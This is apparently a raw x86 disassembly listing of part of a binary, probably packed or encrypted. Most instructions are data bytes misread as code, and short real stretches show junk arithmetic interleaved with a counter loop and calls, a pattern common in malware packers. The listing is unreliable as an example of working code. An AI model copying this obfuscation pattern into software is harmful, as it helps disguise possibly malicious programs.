  407264:	packsswb mm2,QWORD PTR [edx+edx*8]
  407268:	cmp    edi,DWORD PTR [edi+0x63]
  40726b:	pop    eax
  40726c:	jmp    0x392c:0x10bc9218
  407273:	ja     0x407291
  407275:	jg     0x407257
  407277:	mov    bl,0xa1
  407279:	jecxz  0x407243
  40727b:	cmp    eax,edx
  40727d:	out    dx,al
  40727e:	add    BYTE PTR [ebx+0x4755e15e],cl
  407284:	xor    DWORD PTR [ecx-0x50ef4f2d],ebx
  40728a:	sbb    BYTE PTR [edx+edi*1],bh
  40728d:	push   0xffffffe7
  40728f:	push   cs
  407290:	jp     0x40724d
  407292:	inc    edx
  407293:	int3   
  407294:	sub    DWORD PTR [edi+0x6],edi
  407297:	ret    
  407298:	push   0x3d
  40729a:	mov    ah,0xe
  40729c:	jmp    0x7438:0x2743a7ac
  4072a3:	mov    esi,0x71021d1c
  4072a8:	(bad)  
  4072a9:	jo     0x40725f
  4072ab:	xlat   BYTE PTR ds:[ebx]
  4072ac:	push   ds
  4072ad:	leave  
  4072ae:	call   0xea809762
  4072b3:	jnp    0x407330
  4072b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072b6:	push   0x30
  4072b8:	addr16 loop 0x407317
  4072bb:	push   DWORD PTR [eax+0x5a3922b4]
  4072c1:	loope  0x4072e8
  4072c3:	or     cl,dh
  4072c5:	xor    esp,esp
  4072c7:	sub    ch,bh
  4072c9:	pop    eax
  4072ca:	adc    DWORD PTR [edx+0x6ca7207d],0xffffffcb
  4072d1:	sti    
  4072d2:	push   cs
  4072d3:	ss mov bh,dh
  4072d6:	push   ss
  4072d7:	int    0x4
  4072d9:	mov    ch,0xf1
  4072db:	xchg   esi,eax
  4072dc:	inc    eax
  4072dd:	lds    esi,FWORD PTR [esi-0x54]
  4072e0:	cmp    edi,DWORD PTR [eax+ebp*2+0x53]
  4072e4:	push   cs
  4072e5:	cmp    bl,BYTE PTR [ebx]
  4072e7:	fcmovnb st,st(1)
  4072e9:	(bad)  
  4072ea:	sbb    eax,0x58852b79
  4072ef:	in     eax,0x57
  4072f1:	jbe    0x407336
  4072f3:	mov    ss,ebp
  4072f5:	cs hlt 
  4072f7:	out    dx,eax
  4072f8:	pcmpgtd mm4,QWORD PTR [ecx+0x6cc249db]
  4072ff:	fcomp  QWORD PTR [edi]
  407301:	popa   
  407302:	(bad)  
  407303:	and    al,ch
  407305:	(bad)  
  407306:	rcl    esi,1
  407308:	sub    al,0x53
  40730a:	mov    ds:0x8f684a9a,eax
  40730f:	inc    eax
  407310:	add    al,0xe9
  407312:	ja     0x4072f1
  407314:	jmp    0xb4ce6b57
  407319:	adc    edx,0xf7e98a87
  40731f:	jl     0x407380
  407321:	adc    DWORD PTR ds:0x3ae3c677,esi
  407327:	mov    dh,0xf3
  407329:	sub    bl,BYTE PTR [ebp+0x41601bed]
  40732f:	mov    ds:0x9362f6de,eax
  407334:	fldenv [ecx+0x235b7772]
  40733a:	xor    DWORD PTR [eax-0x65],edx
  40733d:	rcr    DWORD PTR [ecx-0x4b07c343],0x74
  407344:	and    cl,al
  407346:	fmul   QWORD PTR [ebx+0x581f445]
  40734c:	sar    esp,1
  40734e:	inc    edx
  40734f:	add    BYTE PTR [ebx],al
  407351:	out    0x42,eax
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fcfd05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e70f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	jp     0x40743a
  4073fd:	(bad)  
  4073fe:	hlt    
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	sbb    dh,bl
  407409:	icebp  
  40740a:	data16 jns 0x407461
  40740d:	in     al,0xca
  40740f:	ret    
  407410:	sbb    edi,edi
  407412:	jmp    0x407460
  407414:	or     BYTE PTR [bp+si+0x1b24],ah
  407419:	mov    dh,BYTE PTR [esp+ebx*2-0x12c30369]
  407420:	and    dl,BYTE PTR [ebx]
  407422:	(bad)  
  407423:	push   cs
  407424:	xchg   ecx,eax
  407425:	repz int 0x63
  407428:	xor    al,0x55
  40742a:	outs   dx,DWORD PTR ds:[esi]
  40742b:	pop    edx
  40742c:	imul   edi,DWORD PTR [edx-0x65a4a29b],0xe4a9df90
  407436:	aaa    
  407437:	ins    BYTE PTR es:[edi],dx
  407438:	in     eax,dx
  407439:	stos   BYTE PTR es:[edi],al
  40743a:	push   es
  40743b:	ror    DWORD PTR ds:0xae0f95b6,0xdf
  407442:	fst    st(1)
  407444:	stos   BYTE PTR es:[edi],al
  407445:	int3   
  407446:	ror    BYTE PTR [ecx-0x7a310239],0x90
  40744d:	pop    ebx
  40744e:	fstp   QWORD PTR [ebp+0x45ae53e]
  407454:	xchg   edx,eax
  407455:	aam    0xb
  407457:	jbe    0x40743e
  407459:	xchg   esp,eax
  40745a:	aaa    
  40745b:	test   DWORD PTR [ebx+0x54f21725],ebp
  407461:	or     eax,edi
  407463:	inc    ecx
  407464:	popf   
  407465:	sub    dh,BYTE PTR [edi-0x3a]
  407468:	xor    BYTE PTR [ebx-0x4a],bl
  40746b:	jl     0x407443
  40746d:	(bad)  
  40746e:	dec    ebp
  40746f:	ins    DWORD PTR es:[edi],dx
  407470:	push   edi
  407471:	out    dx,eax
  407472:	push   0xffffffbe
  407474:	scas   eax,DWORD PTR es:[edi]
  407475:	jbe    0x407448
  407477:	mov    es:0x8e34542a,eax
  40747d:	or     edi,ecx
  40747f:	push   ecx
  407480:	xor    bh,ch
  407482:	pop    edi
  407483:	ror    edi,cl
  407485:	cmp    ebp,eax
  407487:	mov    ds:0xd8e75b5b,eax
  40748c:	repz dec eax
  40748e:	fistp  WORD PTR [ebp+edx*2+0x1]
  407492:	jg     0x40743e
  407494:	cmp    al,0x5f
  407496:	enter  0xebb3,0x8e
  40749a:	add    al,0x1b
  40749c:	lods   eax,DWORD PTR ds:[esi]
  40749d:	dec    ebp
  40749e:	jnp    0x407457
  4074a0:	(bad)  
  4074a2:	xlat   BYTE PTR ds:[ebx]
  4074a3:	mov    ah,0xe1
  4074a5:	ins    BYTE PTR es:[edi],dx
  4074a6:	std    
  4074a7:	add    DWORD PTR [ebp+0xbfd529c],edx
  4074ad:	mov    ch,0x56
  4074af:	sbb    BYTE PTR [ecx+0x6c9d8421],al
  4074b5:	adc    bl,0xc3
  4074b8:	pop    es
  4074b9:	push   esi
  4074ba:	sbb    ecx,0xab51e3dd
  4074c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074c1:	outs   dx,BYTE PTR ds:[esi]
  4074c2:	aaa    
  4074c3:	mov    BYTE PTR [edx-0x79],cl
  4074c6:	lock jl 0x407495
  4074c9:	in     eax,0xd0
  4074cb:	push   cs
  4074cc:	in     al,dx
  4074cd:	inc    ebx
  4074ce:	push   esp
  4074cf:	and    bl,BYTE PTR [ecx]
  4074d1:	fsub   QWORD PTR [edx+0xc]
  4074d4:	xchg   edi,eax
  4074d5:	(bad)  
  4074d6:	enter  0xa0aa,0x2
  4074da:	xchg   ecx,eax
  4074db:	inc    ebx
  4074dc:	xchg   edx,eax
  4074dd:	(bad)  
  4074de:	jp     0x4074b7
  4074e0:	popa   
  4074e1:	test   edx,ecx
  4074e3:	xchg   esi,eax
  4074e4:	and    dl,BYTE PTR [esi+0xa]
  4074e7:	arpl   WORD PTR [edx],bp
  4074e9:	jns    0x407528
  4074eb:	clc    
  4074ec:	ins    BYTE PTR es:[edi],dx
  4074ed:	jb     0x4074a6
  4074ef:	push   ds
  4074f0:	shl    DWORD PTR [ebx],cl
  4074f2:	sbb    bl,ch
  4074f4:	sub    edx,ebx
  4074f6:	imul   edx,DWORD PTR [ecx+0x7ef85401],0x5937b122
  407500:	cmp    al,0xcd
  407502:	jno    0x407521
  407504:	aad    0x2b
  407506:	ja     0x40757c
  407508:	push   edx
  407509:	mov    WORD PTR [esi+0xb6bd02a],cs
  40750f:	sub    eax,0x18340b4
  407514:	mov    esp,0xd198ffe8
  407519:	dec    edi
  40751a:	jne    0x4074d1
  40751c:	call   0xa7cacf2b
  407521:	(bad)  
  407522:	pushf  
  407523:	cmp    DWORD PTR [edi-0x22],edi
  407526:	(bad)  
  407527:	outs   dx,BYTE PTR ds:[esi]
  407528:	adc    ah,ch
  40752a:	sti    
  40752b:	test   DWORD PTR [eax],0xd7445856
  407531:	fnstsw WORD PTR [edx]
  407533:	bound  eax,QWORD PTR [edi-0x60]
  407536:	mov    bl,0x2d
  407538:	and    eax,0x105e7f70
  40753d:	or     BYTE PTR [edx],dl
  40753f:	or     eax,0xd002aa48
  407544:	bound  edi,QWORD PTR [edi+0x7b]
  407547:	inc    eax
  407548:	sub    eax,0x396ccc9
  40754d:	int    0xce
  40754f:	push   es
  407550:	(bad)  
  407551:	sbb    bh,BYTE PTR [eax+ebx*2+0x1d0dea82]
  407558:	sbb    eax,0x9844df8e
  40755d:	xor    dh,ch
  40755f:	sbb    BYTE PTR es:[ebp-0x20cb472d],ch
  407566:	shr    bh,0x20
  407569:	xor    cl,al
  40756b:	rcl    ebx,0xc5
  40756e:	iret   
  40756f:	push   0xc2e8c498
  407574:	leave  
  407575:	fwait
  407576:	(bad)  
  407577:	mov    edi,edx
  407579:	adc    edi,DWORD PTR [eax+0x6cff1371]
  40757f:	pusha  
  407580:	xor    al,0xc2
  407582:	sar    BYTE PTR [ebx],0x37
  407585:	mov    edx,0xf32e919a
  40758a:	test   DWORD PTR [eax+0x28],0x656d840b
  407591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407592:	cmp    DWORD PTR [esi-0x7791071e],esp
  407598:	inc    eax
  407599:	in     eax,dx
  40759a:	xchg   ebp,eax
  40759b:	rcr    BYTE PTR [esi-0x4b],1
  40759e:	add    bl,BYTE PTR [ebx]
  4075a0:	(bad)  
  4075a1:	mov    WORD PTR [ecx+0x12cbcc96],ds
  4075a7:	xchg   esi,eax
  4075a8:	les    esp,FWORD PTR [ecx+0x6df8c80b]
  4075ae:	xchg   edi,eax
  4075af:	and    DWORD PTR [ebx+edi*2+0x42],edx
  4075b3:	data16 xlat BYTE PTR ds:[ebx]
  4075b5:	pop    ebx
  4075b6:	iret   
  4075b7:	push   eax
  4075b8:	mov    eax,ds:0xc7cf425e
  4075bd:	ror    DWORD PTR [esi],cl
  4075bf:	fs scas al,BYTE PTR es:[edi]
  4075c1:	aaa    
  4075c2:	pop    ds
  4075c3:	jae    0x407635
  4075c5:	xlat   BYTE PTR ds:[ebx]
  4075c6:	(bad)  
  4075c7:	mov    ds:0x48fd0550,al
  4075cc:	lock (bad) 
  4075ce:	stos   DWORD PTR es:[edi],eax
  4075cf:	mov    edx,0x22ac5dc3
  4075d4:	mov    ds:0x8de47804,eax
  4075d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075da:	leave  
  4075db:	push   ds
  4075dc:	cmp    bl,BYTE PTR [ebx+eax*4-0x3fe36a55]
  4075e3:	and    DWORD PTR [esi-0x2bed553a],eax
  4075e9:	add    BYTE PTR [edi+0x14],cl
  4075ec:	add    al,0x47
  4075ee:	(bad)  
  4075ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075f0:	pop    edx
  4075f1:	push   cs
  4075f2:	fstp   DWORD PTR [esi]
  4075f4:	and    BYTE PTR [ebx-0x61c5e110],0xa
  4075fb:	jo     0x407635
  4075fd:	das    
  4075fe:	ficom  DWORD PTR [eax]
  407600:	pop    es
  407601:	add    BYTE PTR [edx-0x6461cd4e],0xad
  407608:	or     eax,0xa29101d3
  40760d:	dec    eax
  40760e:	in     al,dx
  40760f:	xchg   ebp,eax
  407610:	test   al,0xc3
  407612:	pop    eax
  407613:	mov    bh,BYTE PTR [eax+0x64]
  407616:	cmp    DWORD PTR [ebx],esp
  407618:	push   ebx
  407619:	call   0x4f8e:0x6947fa0b
  407620:	pop    ebp
  407621:	mov    edx,0x903c4ce1
  407626:	sub    DWORD PTR [edx],ebp
  407628:	(bad)  
  407629:	je     0x4076a3
  40762b:	mov    WORD PTR [eax-0x16],fs
  40762e:	adc    edi,esp
  407630:	(bad)  
  407632:	pmaxsw mm5,mm2
  407635:	cmp    bl,ch
  407637:	inc    eax
  407638:	popa   
  407639:	mov    DWORD PTR [ecx+0x5f],esi
  40763c:	repz test eax,0x8b83f038
  407642:	jmp    0x6cab:0xe4c9b5da
  407649:	add    al,0xb
  40764b:	and    dl,BYTE PTR [edx+edi*8]
  40764e:	dec    esp
  40764f:	sbb    dl,bl
  407651:	xchg   ebx,eax
  407652:	aam    0x7d
  407654:	cdq    
  407655:	imul   ebx,DWORD PTR [ecx],0x5029f37b
  40765b:	dec    eax
  40765c:	clc    
  40765d:	daa    
  40765e:	add    BYTE PTR [eax],0x2f
  407661:	mov    ds:0xfea3a44e,eax
  407666:	fcom   st(7)
  407668:	dec    esp
  407669:	or     al,0x60
  40766b:	daa    
  40766c:	inc    ebx
  40766d:	mov    ecx,0x1e688a68
  407672:	ins    DWORD PTR es:[edi],dx
  407673:	loope  0x407678
  407675:	xchg   edx,ebp
  407677:	sub    al,0xc5
  407679:	jle    0x40760a
  40767b:	sbb    bh,cl
  40767d:	sub    eax,0x5e13101e
  407682:	xchg   ebp,eax
  407683:	mov    BYTE PTR [esi-0x2a],cl
  407686:	mov    bh,0x55
  407688:	iret   
  407689:	xor    eax,0x37be4748
  40768e:	retf   0x8074
  407691:	pop    edi
  407692:	lea    ebx,[ecx+0x149eef78]
  407698:	leave  
  407699:	stos   BYTE PTR es:[edi],al
  40769a:	out    dx,al
  40769b:	clc    
  40769c:	lea    esp,[edi-0x51]
  40769f:	xchg   esp,eax
  4076a0:	ret    0x58e
  4076a3:	push   ecx
  4076a4:	cmp    ebp,ebp
  4076a6:	or     BYTE PTR ds:0x90439633,0x77
  4076ad:	mov    ds:0x2e8726af,al
  4076b2:	sub    al,0xc6
  4076b5:	add    DWORD PTR [eax+0x30],ecx
  4076b8:	cdq    
  4076b9:	ins    DWORD PTR es:[edi],dx
  4076ba:	pop    ds
  4076bb:	or     BYTE PTR [ecx-0x5e],al
  4076be:	data16 (bad) 
  4076c0:	mov    edi,DWORD PTR [eax+0x778cf5fe]
  4076c6:	imul   ecx,esi,0x57
  4076c9:	sar    dl,cl
  4076cb:	push   esp
  4076cc:	sub    DWORD PTR [esi+0x74642808],eax
  4076d2:	rcr    DWORD PTR [eax+esi*8-0x34],1
  4076d6:	sar    BYTE PTR [eax+0x227cd2a6],1
  4076dc:	lea    esi,[edi+0x19]
  4076df:	mov    ebp,0x171f0035
  4076e4:	push   cs
  4076e5:	enter  0x7266,0x31
  4076e9:	pop    edx
  4076ea:	pushf  
  4076eb:	xor    ebp,DWORD PTR [esp+ebx*2]
  4076ee:	shl    BYTE PTR [eax+edx*1+0x15a46d70],cl
  4076f5:	xor    DWORD PTR [ebp+0x14],0xfffffff1
  4076f9:	push   es
  4076fa:	mov    esp,0x69e582a1
  4076ff:	loopne 0x40777c
  407701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407702:	mov    ah,0x8e
  407704:	data16 loopne 0x40776c
  407707:	test   BYTE PTR [ebx+0x2e],bl
  40770a:	inc    esi
  40770b:	shl    ebp,0xed
  40770e:	adc    ch,dh
  407710:	or     al,0xa4
  407712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407713:	dec    edx
  407714:	pop    ecx
  407715:	in     eax,0x68
  407717:	stc    
  407718:	jae    0x407759
  40771a:	pop    ebx
  40771b:	js     0x4076ac
  40771d:	imul   eax,DWORD PTR [edi-0x73],0xffffff98
  407721:	dec    ebp
  407722:	dec    ebp
  407723:	mov    ch,0x58
  407725:	pushw  es
  407727:	mov    dh,dh
  407729:	and    al,0x9c
  40772b:	cmp    BYTE PTR [ebp+0xb],bl
  40772e:	js     0x4076fa
  407730:	shl    al,cl
  407732:	sub    al,0xa8
  407734:	(bad)
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077da:	adc    BYTE PTR [edx+0x70cca7e3],bh
  4077e0:	jo     0x407802
  4077e2:	jge    0x407854
  4077e4:	jo     0x407829
  4077e6:	repz sub eax,0x651f39ba
  4077ec:	cdq    
  4077ed:	test   BYTE PTR [ebx-0x40ae117],dl
  4077f3:	mul    DWORD PTR [ebx]
  4077f5:	arpl   sp,dx
  4077f7:	jnp    0x407781
  4077f9:	or     bh,BYTE PTR ds:0xe58dedd2
  4077ff:	xor    dh,ch
  407801:	rcr    BYTE PTR [eax],cl
  407803:	lods   eax,DWORD PTR ds:[esi]
  407804:	cmp    al,0x78
  407806:	adc    BYTE PTR [ecx+0x24c181fa],bl
  40780c:	repnz mov dl,0xda
  40780f:	xchg   ecx,esp
  407811:	jle    0x40780d
  407813:	dec    eax
  407814:	mov    al,ds:0x8a47f1c5
  407819:	push   cs
  40781a:	daa    
  40781b:	test   DWORD PTR [edi],ecx
  40781d:	xchg   esp,eax
  40781e:	enterw 0x4bd2,0x1d
  407823:	loopne 0x40788a
  407825:	adc    al,0xff
  407827:	and    DWORD PTR [edi],eax
  407829:	push   0x59
  40782b:	sbb    al,0x4
  40782e:	cdq    
  40782f:	ss pop edi
  407831:	icebp  
  407832:	jo     0x4077c8
  407834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407835:	popf   
  407836:	mov    ds:0xa1470526,al
  40783b:	sbb    al,0x88
  40783d:	fs push eax
  40783f:	mov    ebp,0xf880fb79
  407844:	jo     0x4077d0
  407846:	mov    BYTE PTR [edi-0x79],ah
  407849:	sbb    ch,cl
  40784b:	lods   eax,DWORD PTR ds:[esi]
  40784c:	stos   BYTE PTR es:[edi],al
  40784d:	dec    ecx
  40784e:	aaa    
  40784f:	int    0x33
  407851:	cmp    bh,cl
  407853:	pushf  
  407854:	xor    bh,BYTE PTR [eax]
  407856:	fld    DWORD PTR [esi+0x67816e10]
  40785c:	adc    esp,DWORD PTR [esi+ecx*8+0x4f48ebeb]
  407863:	(bad)  
  407864:	xor    al,0x42
  407866:	xor    edi,DWORD PTR [ecx]
  407868:	jbe    0x4077fe
  40786a:	jne    0x407859
  40786c:	xor    ah,ah
  40786e:	push   eax
  40786f:	xlat   BYTE PTR ds:[ebx]
  407870:	sub    dh,dl
  407872:	cmc    
  407873:	retf   
  407874:	fadd   QWORD PTR [edx-0x77e56251]
  40787a:	mov    bl,0x47
  40787c:	sbb    DWORD PTR [edx-0x350361ed],0x3c33c086
  407886:	nop
  407887:	fidiv  WORD PTR [esi+0x2e]
  40788a:	rol    DWORD PTR [ebx+0x208ef7ff],cl
  407890:	dec    esp
  407891:	sub    al,0xd0
  407893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407894:	test   BYTE PTR [ebx],al
  407896:	retw   0x3a44
  40789a:	loope  0x407865
  40789c:	and    ecx,eax
  40789e:	ficomp WORD PTR [eax+0x39e2632]
  4078a4:	lods   eax,DWORD PTR ds:[esi]
  4078a5:	inc    esi
  4078a6:	inc    edi
  4078a7:	es ds inc ecx
  4078aa:	stos   DWORD PTR es:[edi],eax
  4078ab:	pop    edi
  4078ac:	inc    edx
  4078ad:	cmp    ch,bh
  4078af:	outs   dx,DWORD PTR ds:[esi]
  4078b0:	daa    
  4078b1:	add    BYTE PTR [eax],al
  4078b3:	stos   BYTE PTR es:[edi],al
  4078b4:	cmp    ah,al
  4078b6:	inc    esi
  4078b7:	push   ebx
  4078b8:	mov    DWORD PTR fs:[ebx+0x72df9764],edx
  4078bf:	lds    esp,FWORD PTR [esi+ecx*2+0x2d]
  4078c3:	test   BYTE PTR [edi+edx*1-0x79],ch
  4078c7:	out    dx,al
  4078c8:	gs aad 0x8f
  4078cb:	aad    0xc4
  4078cd:	shl    BYTE PTR [esi+0x75216760],cl
  4078d3:	sbb    ah,BYTE PTR [ebp-0x69aff7f6]
  4078d9:	pop    ds
  4078da:	(bad)  
  4078db:	jae    0x407891
  4078dd:	adc    eax,0x65f3c4e8
  4078e2:	clc    
  4078e3:	retf   
  4078e4:	js     0x407911
  4078e6:	fstp   QWORD PTR [ecx]
  4078e8:	mov    al,0xb5
  4078ea:	adc    DWORD PTR [edi+0x6f],eax
  4078ed:	cmc    
  4078ee:	sub    eax,DWORD PTR [esp+ecx*4]
  4078f1:	call   0xe666:0x8f427b2e
  4078f8:	add    eax,0x9233d369
  4078fd:	daa    
  4078fe:	push   ebp
  4078ff:	adc    edx,ecx
  407901:	dec    eax
  407902:	sbb    ecx,ecx
  407904:	mov    ds:0x6204e845,al
  407909:	lea    esp,[eax-0x8b7fdb8]
  40790f:	enter  0xca76,0x4f
  407913:	mov    edx,0x8acb61d2
  407918:	aaa    
  407919:	out    dx,eax
  40791a:	loope  0x407919
  40791c:	adc    BYTE PTR [ecx+0x2a78d337],ah
  407922:	pushf  
  407923:	mov    cl,0x71
  407925:	ror    al,1
  407927:	dec    ecx
  407928:	cmp    DWORD PTR [ebp-0x31],esp
  40792b:	jmp    0x4078cf
  40792d:	cdq    
  40792e:	push   esp
  40792f:	aas    
  407930:	mov    WORD PTR [ecx-0x6],gs
  407933:	xchg   ecx,eax
  407934:	xchg   esp,eax
  407935:	lds    edi,FWORD PTR [edi]
  407937:	(bad)
  40793c:	lock xchg BYTE PTR [edi],bl
  40793f:	mov    ebp,DWORD PTR [edx+edx*8]
  407942:	popa   
  407943:	push   0xe79a7465
  407948:	dec    ebx
  407949:	(bad)  
  40794a:	jmp    0x40795d
  40794c:	arpl   sp,dx
  40794e:	ins    DWORD PTR es:[edi],dx
  40794f:	push   ecx
  407950:	inc    ecx
  407951:	ret    0x9122
  407954:	sbb    ebx,0x6b201576
  40795a:	nop
  40795b:	jecxz  0x4079bd
  40795d:	loopne 0x407980
  40795f:	pop    ss
  407960:	mov    bh,0xaf
  407962:	and    eax,0x4b59892f
  407967:	pop    ebp
  407968:	sub    BYTE PTR [esi],0x5c
  40796b:	call   0xf88b:0xa6d0d2aa
  407972:	push   0x6462ffc3
  407977:	pop    eax
  407978:	lock push ecx
  40797a:	sbb    DWORD PTR [edx+eiz*4-0x442f0430],esp
  407981:	(bad)  
  407982:	je     0x407961
  407984:	cs cmc 
  407986:	add    edi,ecx
  407988:	xor    BYTE PTR [ebp+0x792c94c8],dl
  40798e:	das    
  40798f:	dec    ecx
  407990:	outs   dx,DWORD PTR ds:[esi]
  407991:	js     0x40795f
  407993:	inc    ebx
  407994:	loope  0x407919
  407996:	fidiv  DWORD PTR [eax-0x2805a2a]
  40799c:	sub    al,0x56
  40799e:	or     edx,DWORD PTR [ebp+0x1588d19a]
  4079a4:	ss mov bh,0x53
  4079a7:	sbb    ch,BYTE PTR [ebx+0x7]
  4079aa:	and    al,BYTE PTR [ebp+esi*4+0x8]
  4079ae:	and    al,0x5f
  4079b0:	push   esp
  4079b1:	out    0x76,eax
  4079b3:	scas   eax,DWORD PTR es:[edi]
  4079b4:	jmp    DWORD PTR [ecx]
  4079b6:	xchg   DWORD PTR [eax],edx
  4079b8:	jge    0x407993
  4079ba:	cmp    DWORD PTR [esi-0x17],ebx
  4079bd:	daa    
  4079be:	mov    ds:0xb2ff0af1,eax
  4079c3:	rol    BYTE PTR [ecx],cl
  4079c5:	mov    eax,DWORD PTR [edx]
  4079c7:	daa    
  4079c8:	pop    edi
  4079c9:	jmp    0x7fe566e9
  4079ce:	add    dh,bh
  4079d0:	mov    eax,0xbfbd8b
  4079d5:	std    
  4079d6:	mov    dh,0xe7
  4079d8:	and    DWORD PTR [ecx],ebx
  4079da:	out    dx,al
  4079db:	jb     0x4079c7
  4079dd:	fisttp DWORD PTR ds:0xf1c236c7
  4079e3:	and    eax,DWORD PTR [edx-0x66]
  4079e6:	push   ebx
  4079e7:	sti    
  4079e8:	int3   
  4079e9:	(bad)  
  4079ea:	ret    0x5e14
  4079ed:	test   ecx,esi
  4079ef:	ds mov edx,0x525a1807
  4079f5:	adc    al,0xf1
  4079f7:	add    al,0x77
  4079f9:	in     al,0xff
  4079fb:	in     eax,0xe2
  4079fd:	fadd   st(0),st
  4079ff:	xor    al,0x7
  407a01:	push   eax
  407a02:	add    esi,DWORD PTR [ebp+0x65]
  407a05:	add    eax,0x9d50f610
  407a0a:	stc    
  407a0b:	out    dx,al
  407a0c:	ret    0x9990
  407a0f:	(bad)  ds:0xe5cb8d9c
  407a15:	test   DWORD PTR [ebx-0x5e],edx
  407a18:	popf   
  407a19:	cmp    eax,0x2640da50
  407a1e:	xchg   esp,eax
  407a1f:	clc    
  407a20:	jp     0x407a3b
  407a22:	mov    esp,0xafb0cefd
  407a27:	adc    dh,BYTE PTR [ecx-0x6a87bda6]
  407a2d:	sub    cl,BYTE PTR [edx-0x53]
  407a30:	aas    
  407a31:	adc    al,0x93
  407a33:	push   esp
  407a34:	inc    ecx
  407a35:	jmp    0x4079db
  407a37:	cmc    
  407a38:	lods   eax,DWORD PTR ds:[esi]
  407a39:	les    esi,FWORD PTR [ebp-0x11f5cea6]
  407a3f:	and    BYTE PTR [esi],bh
  407a41:	jnp    0x407a8c
  407a43:	mov    ebp,DWORD PTR [edi+ebx*1]
  407a46:	inc    ebx
  407a47:	repnz add ebx,0xffffffc0
  407a4b:	mov    dl,0xbd
  407a4d:	(bad)  
  407a4e:	cmc    
  407a4f:	dec    esi
  407a50:	xchg   cl,ah
  407a52:	xor    eax,0x2c810d43
  407a57:	sti    
  407a58:	jne    0x407a1d
  407a5a:	pop    esi
  407a5b:	into   
  407a5c:	rcr    BYTE PTR [eax-0x17322ddb],1
  407a62:	aad    0x16
  407a64:	jmp    0x407aa9
  407a66:	test   DWORD PTR [eax-0x62],edi
  407a69:	mov    al,ds:0xd98a83a1
  407a6e:	test   DWORD PTR [eax],ebp
  407a70:	cmc    
  407a71:	cmp    al,0x79
  407a73:	add    dl,BYTE PTR [esi]
  407a75:	mov    al,ds:0xb3ca8303
  407a7a:	pop    ss
  407a7b:	aam    0xfb
  407a7d:	dec    edi
  407a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7f:	cs pop edx
  407a81:	pop    es
  407a82:	or     DWORD PTR [ecx-0x540fc80c],ecx
  407a88:	mov    cl,al
  407a8a:	popf   
  407a8b:	mov    al,ds:0x483ea179
  407a90:	out    0x9,eax
  407a92:	sbb    DWORD PTR ds:0x3d1c5ef7,edx
  407a98:	call   0x3431:0xce33dd38
  407a9f:	xchg   BYTE PTR [edi-0x1d9d9ba7],ch
  407aa5:	adc    al,0xb6
  407aa7:	loop   0x407a34
